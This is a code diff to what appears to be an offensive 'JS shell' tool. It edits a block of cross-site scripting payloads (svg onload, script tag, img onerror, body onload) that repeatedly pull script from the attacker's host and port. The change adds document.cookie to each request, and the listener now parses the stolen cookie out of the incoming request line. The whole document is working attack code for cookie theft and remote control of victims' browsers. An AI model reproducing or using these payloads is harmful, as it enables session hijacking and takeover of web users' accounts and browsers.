@@ -59,10 +59,10 @@ gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
 payload = '''
- - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}"}},1010)>
- - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}"}},1010)</script>
- - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}"}},1010)>
- - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}"}}></body>
+ - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
+ - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}?"+document.cookie}},1010)</script>
+ - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}?"+document.cookie}},1010)>
+ - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}?"+document.cookie}}></body>
 '''.format(host, port)
 
         
@@ -172,6 +172,7 @@ def main():
         
     if 'Accept' in resp and 'HTTP' in resp:
         print('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
+        cookie = resp.split('\n')[0].split("?")[1]
         for line in resp.split('\n'):
             if 'referer' in line.lower():
                 referer = line.lower().replace('referer: ', '')
@@ -179,8 +180,6 @@ def main():
                 pth = '/'.join(referer.split('/')[3:])
                 if pth == '\r':
                     pth = '/'
-            elif 'cookie' in line.lower():
-                cookie = line.lower().replace('cookie: ', '')
         if len(cmd):
             c.send(form + cmd.encode())
             print('%s>>>%s %s' % (blue, white, cmd))
